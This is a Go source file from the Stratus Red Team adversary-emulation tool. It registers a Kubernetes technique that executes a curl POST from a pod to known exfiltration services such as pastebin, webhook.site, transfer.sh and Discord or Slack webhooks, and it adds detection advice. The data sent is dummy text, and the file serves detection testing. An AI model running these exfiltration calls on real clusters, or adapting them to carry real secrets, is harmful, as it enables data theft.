package kubernetes

import (
	"context"
	_ "embed"
	"fmt"
	"log"
	"sort"
	"strings"
	"time"

	"github.com/datadog/stratus-red-team/v2/internal/utils/kubernetes"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

const techniqueID = "k8s.exfiltration.connect-exfil-domain"

type ExfilDomain string

const (
	WebhookSite ExfilDomain = "webhook.site"
	Pastebin    ExfilDomain = "pastebin"
	RequestBin  ExfilDomain = "requestbin"
	PipeDream   ExfilDomain = "pipedream"
	Telegram    ExfilDomain = "telegram"
	Discord     ExfilDomain = "discord"
	Slack       ExfilDomain = "slack"
	TransferSh  ExfilDomain = "transfer.sh"
	FileIO      ExfilDomain = "file.io"
	Pastebincom ExfilDomain = "pastebin.com"
)

var exfilDomainURLs = map[ExfilDomain]string{
	WebhookSite: "https://webhook.site",
	Pastebin:    "https://pastebin.com",
	RequestBin:  "https://requestbin.com",
	PipeDream:   "https://pipedream.com",
	Telegram:    "https://api.telegram.org",
	Discord:     "https://discord.com/api/webhooks",
	Slack:       "https://hooks.slack.com",
	TransferSh:  "https://transfer.sh",
	FileIO:      "https://file.io",
	Pastebincom: "https://pastebin.com/api",
}

func supportedExfilDomains() string {
	var domains []string
	for domain := range exfilDomainURLs {
		domains = append(domains, string(domain))
	}
	sort.Strings(domains)
	return strings.Join(domains, ", ")
}

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 techniqueID,
		FriendlyName:       "Connect to Data Exfiltration Domain from Pod",
		Platform:           stratus.Kubernetes,
		IsIdempotent:       true,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Exfiltration},
		Description: `
Connects to a known data exfiltration domain from within a pod.
This simulates an attacker attempting to exfiltrate data to external services.

Warm-up:

- Create the Stratus Red Team namespace
- Create a Pod

Detonation:

- Execute a curl command in the pod to connect to an exfiltration domain
- Supported domains: ` + supportedExfilDomains() + `
`,
		Detection: `
Monitor for:
- Outbound connections to known exfiltration domains
- DNS queries for webhook.site, pastebin.com, transfer.sh, file.io, ...
- Connections to messaging platform APIs (api.telegram.org, discord.com, hooks.slack.com, ...)
`,
		PrerequisitesTerraformCode: tf,
		PodConfigViaTerraform:      true,
		Detonate:                   detonate,
	})
}

// TODO: Implement TTP variation
func detonate(params map[string]string, providers stratus.CloudProviders) error {
	return detonateWithOptions(params, providers, Pastebin)
}

func detonateWithOptions(params map[string]string, providers stratus.CloudProviders, domain ExfilDomain) error {
	config := providers.K8s().GetRestConfig()
	client := providers.K8s().GetClient()
	namespace := params["namespace"]
	podName := params["pod_name"]

	url, ok := exfilDomainURLs[domain]
	if !ok {
		return fmt.Errorf("unknown exfiltration domain: %s", domain)
	}

	log.Printf("Connecting to exfiltration domain: %s", domain)

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Send a POST request with some dummy data
	cmd := []string{
		"curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
		"-X", "POST",
		"-H", "User-Agent: stratus-red-team",
		"-H", "Content-Type: application/octet-stream",
		"-d", "stratus-red-team-test-data",
		url,
	}

	stdout, stderr, err := kubernetes.ExecInPod(ctx, config, client, namespace, podName, "", cmd)
	if err != nil {
		return fmt.Errorf("failed to connect to exfiltration domain: %w (stderr: %s)", err, stderr)
	}

	log.Printf("Connection to %s completed with HTTP status: %s", domain, stdout)
	return nil
}
